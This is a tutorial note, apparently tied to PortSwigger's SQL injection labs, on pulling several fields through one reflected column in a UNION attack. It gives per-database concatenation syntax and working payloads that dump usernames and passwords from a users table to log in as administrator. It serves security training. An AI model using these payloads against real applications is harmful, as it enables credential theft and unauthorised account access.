# Retrieving multiple values in a single column

When a UNION-based SQL injection only gives you **one usable column** in the response, you can still pull back several fields at once by **concatenating** them into that single column.

---

**Table of contents**

- [In plain English](#in-plain-english)
- [The problem: only one column to work with](#the-problem-only-one-column-to-work-with)
- [Concatenating values](#concatenating-values)
- [Concatenation syntax per database](#concatenation-syntax-per-database)
- [Lab: retrieving multiple values in a single column](#lab-retrieving-multiple-values-in-a-single-column)

---

## In plain English

| Topic | The idea | Takeaway |
| --- | --- | --- |
| **One column, many values** | Glue several fields together into one string with a separator you choose | If the page only shows you **one column**, you don't need more — **staple the values together** (`username~password`) and read them out of that single slot. |

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>How to use these notes:</strong> these are a lookup sheet, not something to memorise. Remember the one-line hook above; come back here for the exact syntax when you need it.
</div>

---

## The problem: only one column to work with

In an earlier UNION attack you find how many columns the query returns and which ones show up in the response. Sometimes **only a single column** is actually reflected back to you on the page.

That single column isn't a dead end. You can smuggle multiple values through it by joining them into **one** string.

---

## Concatenating values

Combine the fields you want into one value, with a **separator character** in between so you can tell them apart afterwards. On **Oracle**, `||` is the string concatenation operator:

```sql
' UNION SELECT username || '~' || password FROM users--
```

This joins each row's `username` and `password` together, separated by `~`. The response then contains every username/password pair in that one column:

```
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```

The `~` is arbitrary — pick any character that won't appear inside the data itself, so the two halves stay easy to split apart.

---

## Concatenation syntax per database

Different databases concatenate strings differently. Common forms:

| Database | Syntax | Example |
| --- | --- | --- |
| Oracle | `'a' \|\| 'b'` | `username \|\| '~' \|\| password` |
| PostgreSQL | `'a' \|\| 'b'` | `username \|\| '~' \|\| password` |
| Microsoft SQL Server | `'a' + 'b'` | `username + '~' + password` |
| MySQL | `CONCAT('a','b')` *(space-separated `'a' 'b'` also works)* | `CONCAT(username, '~', password)` |

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Watch the database type:</strong> using the wrong concatenation operator throws an error, not results. Confirm the database type first (see <a href="Examining-the-database.md">Examining the database</a>), then pick the matching syntax. The full list lives in PortSwigger's SQL injection cheat sheet.
</div>

---

## Lab: retrieving multiple values in a single column

> **PRACTITIONER** — SQL injection UNION attack, retrieving multiple values in a single column.

**Goal:** the product category filter is injectable and results are reflected in the response. The database has a `users` table with `username` and `password` columns. Retrieve all usernames and passwords, then log in as `administrator`.

**Approach:**

1. Work out the column count and which columns are reflected (a prior UNION step). Here, only **one** column returns text.
2. Concatenate `username` and `password` into that column with a separator:

   ```sql
   ' UNION SELECT NULL,username||'~'||password FROM users--
   ```

   *(`NULL` fills the non-text column so the column count still matches; the text column carries the concatenated data.)*
3. Read the `administrator` row's password from the response, then log in.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Why <code>NULL</code> in the other column:</strong> a UNION requires the same number of columns on both sides, and each pair of columns must share a compatible type. <code>NULL</code> is compatible with any type, so it's the safe filler for columns you don't need.
</div>
